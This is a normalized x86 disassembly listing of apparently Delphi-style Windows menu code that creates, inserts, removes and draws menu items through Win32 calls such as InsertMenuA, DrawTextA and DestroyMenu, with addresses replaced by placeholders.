call sub_3a64530
mov eax [ eax + 0x6c ]
mov edx [ ebx + 0x18 ]
movzx edx [ edx + 0x3f ]
cmp eax edx
je r-xdata
mov al 0x1
pop ebx
retn
sub_3aa32a4
push ebx
mov ebx eax
mov eax ebx
call sub_3ac0ad4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_3a64530
mov eax [ eax + 0x80 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_3aa32d8
push ebx
mov ebx eax
mov eax ebx
call sub_3ac0ae8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_3a64530
movzx eax [ eax + 0x84 ]
mov edx [ ebx + 0x18 ]
cmp ax [ edx + 0x60 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_3aa330c
push ebx
mov ebx eax
mov eax ebx
call sub_3ac0afc
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_3a64530
movzx eax [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x3e ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_3aa3340
push ebx
mov ebx eax
mov eax ebx
call sub_3a83f70
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x88 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_3aa3368
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0xa8 ] bl
sub_3aa3388
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_3aa64f8
sub_3aa33a8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_3aa656c
sub_3aa33c8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_3aa65c0
sub_3aa33e8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov [ eax + 0x54 ] esi
sub_3aa3404
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x58
mov edx esi
call sub_3a652f4
sub_3aa3428
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_3aa66ec
sub_3aa3448
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_3aa66c8
sub_3aa3468
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_3aa66dc
sub_3aa3488
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x88 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x8c ] edx
sub_3aa34b4
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_3a83664
mov [ ebx + 0x3e ] 0x1
mov [ ebx + 0x39 ] 0x1
mov [ ebx + 0x3b ] 0x2
mov [ ebx + 0x3c ] 0x2
call sub_3aa2f98
mov [ ebx + 0x50 ] ax
mov [ ebx + 0x40 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov esi eax
mov [ ebx + 0x78 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_3aa7004
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3aa3530
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_3aa9264
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
mov eax esi
call sub_3aa6694
test eax eax
jg r-xdata
mov edx esi
call sub_3aa6a30
xor eax eax
mov [ esi + 0x64 ] eax
jmp r-xdata
xor edx edx
mov eax esi
call sub_3aa66a4
call sub_3a64380
cmp [ esi + 0x34 ] 0x0
je r-xdata
mov eax [ esi + 0x5c ]
call sub_3a64380
lea eax [ esi + 0x44 ]
call sub_3a6efbc
lea eax [ esi + 0x78 ]
call sub_3a6efbc
movzx eax [ esi + 0x50 ]
test ax ax
je r-xdata
xor edx edx
mov eax esi
call sub_3aa39a0
mov eax [ esi + 0x34 ]
push eax
call DestroyMenu
mov eax [ esi + 0x4c ]
test eax eax
je r-xdata
movzx edx ax
xor ecx ecx
mov eax [ rw-data ]
call sub_3a7aa00
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3a836b0
test bl bl
jle r-xdata
call sub_3a64380
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3aa35e4
push ebp
mov ebp esp
add esp 0xffffffbc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x9 ] cl
mov [ ebp - 0x8 ] edx
mov edi eax
xor eax eax
push ebp
push sub_3aa3896
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ edi + 0x3e ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aa389d
lea eax [ ebp - 0x44 ]
call sub_3a652a0
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
lea eax [ ebp - 0x4 ]
mov edx [ edi + 0x30 ]
call sub_3a65338
mov eax edi
call sub_3aa6694
test eax eax
jle r-xdata
cmp [ edi + 0x60 ] 0x0
je r-xdata
mov eax edi
call sub_3aa3b48
mov [ ebp - 0x2c ] eax
jmp r-xdata
call GetVersion
and eax 0xff
cmp ax 0x4
jb r-xdata
mov ebx [ edi + 0x64 ]
test ebx ebx
je r-xdata
mov eax [ edi + 0x30 ]
mov edx r-xdata
call sub_3a656c8
sete al
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
movzx eax [ edi + 0x48 ]
mov eax [ eax * 4 + rw-data ]
movzx edx [ edi + 0x38 ]
or eax [ edx * 4 + rw-data ]
movzx edx [ edi + 0x39 ]
or eax [ edx * 4 + rw-data ]
or ebx eax
or ebx 0x400
mov eax edi
call sub_3aa6694
test eax eax
jle r-xdata
mov [ ebp - 0x40 ] 0x2c
mov [ ebp - 0x3c ] 0x3f
mov eax edi
call sub_3aa6c54
mov esi eax
mov eax edi
call sub_3aa5e18
mov [ ebp - 0x10 ] eax
test esi esi
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
lea edx [ ebp - 0x44 ]
movzx eax [ edi + 0x60 ]
call sub_3aa2bd4
push [ ebp - 0x44 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_3a65634
cmp [ ebx + 0x64 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a65730
push eax
movzx eax [ edi + 0x50 ]
push eax
push ebx
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
call InsertMenuA
mov eax [ edi + 0x30 ]
call sub_3a65730
push eax
mov eax edi
call sub_3aa3b48
push eax
or ebx 0x10
push ebx
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
call InsertMenuA
jmp r-xdata
mov ebx [ edi + 0x4c ]
test ebx ebx
je r-xdata
cmp [ esi + 0x40 ] 0x0
jne r-xdata
mov eax [ ebx + 0x4 ]
mov edx [ r-xdata ]
call sub_3a6450c
test al al
jne r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov al 0x1
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov ebx eax
mov eax [ edi + 0x64 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov eax [ edi + 0x30 ]
mov edx r-xdata
call sub_3a656c8
sete al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
movzx edx [ edi + 0x3d ]
mov edx [ edx * 4 + rw-data ]
movzx ecx [ edi + 0x48 ]
or edx [ ecx * 4 + rw-data ]
or eax edx
movzx edx [ ebp - 0x9 ]
or eax [ edx * 4 + rw-data ]
movzx edx bl
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x38 ] eax
movzx eax [ edi + 0x38 ]
mov eax [ eax * 4 + rw-data ]
movzx edx [ edi + 0x39 ]
or eax [ edx * 4 + rw-data ]
movzx edx [ edi + 0x3a ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x34 ] eax
movzx eax [ edi + 0x50 ]
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x4 ]
call sub_3a65730
mov [ ebp - 0x1c ] eax
mov eax edi
call sub_3aa6694
test eax eax
jle r-xdata
xor edx edx
mov eax 0x6
call sub_3a6dbb4
test al al
je r-xdata
lea eax [ ebp - 0x40 ]
push eax
push 0xffffffff
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
call InsertMenuItemA
jmp r-xdata
mov eax edi
call sub_3aa3b48
mov [ ebp - 0x2c ] eax
call sub_3abdd24
cmp [ eax + 0x5 ] 0x0
je r-xdata
test bl bl
je r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov ebx eax
cmp [ edi + 0x4c ] 0x0
jne r-xdata
cmp [ edi + 0x40 ] 0xffffffff
jne r-xdata
mov al 0x1
cmp [ esi + 0x40 ] 0x0
jne r-xdata
sub_3aa38b3
inc [ ecx ]
add [ eax ] al
add [ 0x55000000 ] ch
mov ebp esp
mov edx [ ebp + 0x8 ]
movzx ecx [ edx - 0x5 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x34 ]
call sub_3aa35e4
xor eax eax
pop ebp
retn
sub_3aa38d8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_3aa84d4
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_3aa7280
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_3aa7768
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax r-xdata
mov ecx [ ebp - 0x4 ]
call sub_3aa301c
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_3aa3948
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_3aa3992
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_3a7fdac
mov eax [ ebp - 0x4 ]
call sub_3aa2e54
mov edx eax
mov eax ebx
call sub_3aa66c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aa3999
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3aa39a0
push ebx
mov ebx eax
test edx edx
je r-xdata
mov eax [ ebx + 0x68 ]
cmp edx eax
je r-xdata
test [ edx + 0x1c ] 0x8
jne r-xdata
pop ebx
retn
test eax eax
je r-xdata
mov eax edx
mov [ ebx + 0x68 ] eax
test eax eax
je r-xdata
xor ecx ecx
mov [ eax + 0x6c ] ecx
mov eax ebx
call sub_3aa3a18
mov [ eax + 0x6c ] ebx
mov edx ebx
call sub_3a83738
sub_3aa39dc
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_3a83acc
mov eax ebx
call sub_3aa667c
test eax eax
je r-xdata
cmp [ ebx + 0x74 ] 0x0
je r-xdata
mov eax ebx
call sub_3aa667c
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_3a6457c
pop esi
pop ebx
retn
mov eax ebx
call sub_3aa3a18
sub_3aa3a18
push ebx
push esi
push edi
push ebp
mov ebp eax
test [ ebp + 0x1c ] 0x8
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebp + 0x1c ] 0x2
je r-xdata
mov eax [ ebp + 0x6c ]
test eax eax
je r-xdata
mov [ ebp + 0x74 ] 0x1
jmp r-xdata
mov eax ebp
call sub_3aa3b48
push eax
call GetMenuItemCount
mov esi eax
test esi esi
sete bl
test esi esi
jle r-xdata
call sub_3aa3a18
jmp r-xdata
test bl bl
je r-xdata
push 0x400
mov edi esi
dec edi
push edi
mov eax ebp
call sub_3aa3b48
push eax
call GetMenuState
test al 0x4
jne r-xdata
cmp [ ebp + 0x64 ] 0x0
jne r-xdata
dec esi
test esi esi
jg r-xdata
push 0x400
push edi
mov eax ebp
call sub_3aa3b48
push eax
call RemoveMenu
mov bl 0x1
mov eax ebp
call sub_3aa38d8
mov eax [ ebp + 0x70 ]
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov eax ebp
call sub_3aa3b48
push eax
call GetMenuItemCount
test eax eax
jne r-xdata
mov eax [ ebp + 0x34 ]
push eax
call DestroyMenu
xor eax eax
mov [ ebp + 0x34 ] eax
jmp r-xdata
xor edx edx
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_3aa3ae8
push ebx
push esi
push edi
push ebp
push ecx
mov ebx ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_3aa6694
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx ebp
mov eax edi
call sub_3aa66a4
cmp bl [ eax + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax edi
call sub_3aa66a4
cmp bl [ eax + 0x3f ]
jae r-xdata
inc ebp
dec esi
jne r-xdata
mov edx ebp
mov eax edi
call sub_3aa66a4
mov [ eax + 0x3f ] bl
mov eax [ rw-data ]
call sub_3aa2b28
jmp r-xdata
cmp ebp [ esp ]
jge r-xdata
sub_3aa3b48
push ebx
mov ebx eax
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov eax [ ebx + 0x34 ]
pop ebx
retn
mov eax [ ebx + 0x4 ]
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
call CreateMenu
mov [ ebx + 0x34 ] eax
call CreatePopupMenu
mov [ ebx + 0x34 ] eax
jmp r-xdata
mov eax ebx
call sub_3aa38d8
mov eax [ rw-data ]
call sub_3aa2b28
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
sub_3aa3b94
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_3a839f4
push ebx
push sub_3aa3948
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_3aa3bd8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_3aa3dc8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_3aa6c54
mov edi eax
test edi edi
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
call sub_3a65338
test bh 0x4
je r-xdata
mov eax edi
call sub_3aa84d4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_3a656c8
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test bl 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_3a89c5c
cmp [ esi + 0x3a ] 0x0
je r-xdata
test bh 0x4
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_3a6556c
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x26
jne r-xdata
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
and ebx 0xffffffff
or ebx 0x2
jmp r-xdata
cmp [ esi + 0x39 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edi [ eax + 0xc ]
mov eax edi
call sub_3a895a8
mov edx eax
or dl [ r-xdata ]
mov eax edi
call sub_3a895b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aa3dcf
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
mov eax [ ebp + 0x10 ]
mov esi eax
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add [ ebp - 0x18 ] 0x4
push 0x2
push 0x6
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x8 ]
call sub_3a8a340
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
or ebx 0x20000
and ebx 0xfffffffd
or ebx 0x0
mov eax [ ebp - 0x8 ]
call sub_3a8a340
mov edi eax
mov esi [ ebp - 0x4 ]
test esi esi
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
push ebx
mov eax [ ebp + 0x10 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
call sub_3a65730
push eax
push edi
call DrawTextA
sub esi 0x4
mov esi [ esi ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_3a89220
mov eax [ ebp - 0x8 ]
call sub_3a8a340
mov edi eax
mov esi [ ebp - 0x4 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_3a89220
mov eax 0xff00000d
call sub_3a88d54
mov esi eax
mov eax 0xff000010
call sub_3a88d54
cmp esi eax
jne r-xdata
push ebx
mov eax [ ebp + 0x10 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
call sub_3a65730
push eax
push edi
call DrawTextA
push 0xffffffff
push 0xffffffff
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
sub esi 0x4
mov esi [ esi ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_3a89220
jmp r-xdata
sub_3aa3e34
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x58 ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov edi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_3aa3fe9
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x50 ]
xor ecx ecx
mov edx 0x40
call sub_3a63a44
mov [ ebp - 0x50 ] 0x40
mov [ ebp - 0x4c ] 0x2001
mov eax ebx
and eax 0x400
cmp eax 0x400
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push 0xedb
movzx eax [ edi + 0x39 ]
mov eax [ eax * 4 + rw-data ]
push eax
push 0xe
call sub_3abdd24
mov dl 0x7
call sub_3abddec
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ esi + 0xc ]
mov eax [ eax + 0x18 ]
call sub_3a88d54
mov [ ebp - 0x48 ] eax
mov eax edi
call sub_3aa6c54
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
or [ ebp - 0x4c ] 0x200
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_3a65338
test bh 0x4
je r-xdata
mov eax [ ebp - 0xc ]
call sub_3aa84d4
test al al
je r-xdata
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_3a89c5c
cmp [ edi + 0x3a ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test bl 0x0
jne r-xdata
movzx eax [ edi + 0x39 ]
mov eax [ eax * 4 + rw-data ]
push eax
lea eax [ ebp - 0x54 ]
mov edx [ ebp - 0x4 ]
call sub_3a65bdc
mov eax [ ebp - 0x54 ]
call sub_3a65bec
push eax
lea eax [ ebp - 0x58 ]
mov edx [ ebp - 0x4 ]
call sub_3a65bdc
mov eax [ ebp - 0x58 ]
call sub_3a65bfc
push eax
push ebx
mov eax [ ebp + 0x10 ]
push eax
lea eax [ ebp - 0x50 ]
push eax
call sub_3abdd24
mov dl 0x7
call sub_3abddec
push eax
mov eax esi
call sub_3a8a340
mov edx eax
mov ecx 0xe
pop eax
call sub_3a90ea4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aa3ff0
lea eax [ ebp - 0x58 ]
mov edx 0x2
call sub_3a65a94
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
mov eax [ esi + 0xc ]
call sub_3a895a8
mov edx eax
or dl [ r-xdata ]
mov eax [ esi + 0xc ]
call sub_3a895b4
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_3a6556c
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x26
jne r-xdata
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
and ebx 0xffffffff
or ebx 0x2
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
or ebx 0x20000
and ebx 0xfffffffd
or ebx 0x0
sub_3aa400c
push ebp
mov ebp esp
add esp 0xffffff98
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebp + 0x8 ]
add esi 0xffffffe8
mov edi [ ebp + 0x8 ]
add edi 0xfffffff0
xor eax eax
push ebp
push sub_3aa4943
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0x0
push edi
push 0x0
push 0x9
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_3a8a340
push eax
call sub_3abdd24
mov dl 0x7
call sub_3abddec
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
lea eax [ ebp - 0x8 ]
push eax
push 0xedb
mov eax [ esi ]
movzx eax [ eax + 0x39 ]
mov eax [ eax * 4 + rw-data ]
push eax
push 0xe
call sub_3abdd24
mov dl 0x7
call sub_3abddec
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x8 ]
call sub_3a89220
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ edi + 0x4 ]
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x2c ]
add eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x58 ]
push eax
mov ecx [ edi + 0x8 ]
mov edx [ edi + 0x4 ]
mov eax [ edi + 0x8 ]
sub eax [ ebp - 0x18 ]
sub eax [ ebp - 0x34 ]
sub eax [ ebp - 0x34 ]
call sub_3a78e1c
mov eax [ edi + 0x4 ]
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x2c ]
add eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x58 ]
push eax
mov ecx [ edi ]
add ecx [ ebp - 0x18 ]
add ecx [ ebp - 0x34 ]
add ecx [ ebp - 0x34 ]
mov edx [ edi + 0x4 ]
mov eax [ edi ]
call sub_3a78e1c
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_3a89b20
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_3a89220
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
push esi
push edi
lea esi [ eax - 0x28 ]
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x2c ]
mov eax [ eax + 0x30 ]
cmp eax [ ebp - 0x14 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
push esi
push edi
lea edi [ eax - 0x28 ]
lea esi [ ebp - 0x58 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x2c ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_3a89f04
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_3a89b20
lea eax [ ebp - 0x10 ]
push eax
push 0x1
push 0x0
push 0x0
push 0xd
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_3a8a340
push eax
call sub_3abdd24
mov dl 0x7
call sub_3abddec
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
lea eax [ ebp - 0x28 ]
push eax
push 0x0
push 0xe11
push 0x0
push 0xd
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_3a8a340
push eax
call sub_3abdd24
mov dl 0x7
call sub_3abddec
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax ebx
xor al 0x1
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x2c ]
mov eax [ eax + 0x34 ]
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov edx [ ebp + 0x8 ]
sub eax [ ebp - 0x14 ]
mov edx [ ebp + 0x8 ]
add [ edx - 0x1c ] eax
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push 0x0
mov eax [ esi ]
movzx eax [ eax + 0x3d ]
mov edx [ esi ]
movzx edx [ edx + 0x39 ]
lea edx [ edx * 8 + rw-data ]
mov eax [ edx + eax * 4 ]
push eax
push 0xb
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_3a8a340
push eax
call sub_3abdd24
mov dl 0x7
call sub_3abddec
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
lea eax [ ebp - 0x38 ]
push eax
push 0x0
push 0xe12
mov eax [ esi ]
movzx eax [ eax + 0x3d ]
mov edx [ esi ]
movzx edx [ edx + 0x39 ]
lea edx [ edx * 8 + rw-data ]
mov eax [ edx + eax * 4 ]
push eax
push 0xb
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_3a8a340
push eax
call sub_3abdd24
mov dl 0x7
call sub_3abddec
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax ebx
xor al 0x1
test al al
je r-xdata
mov eax [ ebp - 0x10 ]
add eax [ ebp - 0x34 ]
sub [ ebp - 0x48 ] eax
mov eax [ ebp - 0x24 ]
sub [ ebp - 0x40 ] eax
mov eax [ ebp - 0x10 ]
add eax [ ebp - 0x38 ]
add [ ebp - 0x40 ] eax
mov eax [ ebp - 0x28 ]
add [ ebp - 0x40 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
sub eax [ ebp - 0x4c ]
sar eax 0x1
jns r-xdata
mov edx ebx
xor dl 0x1
test dl dl
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x48 ]
push eax
push 0x0
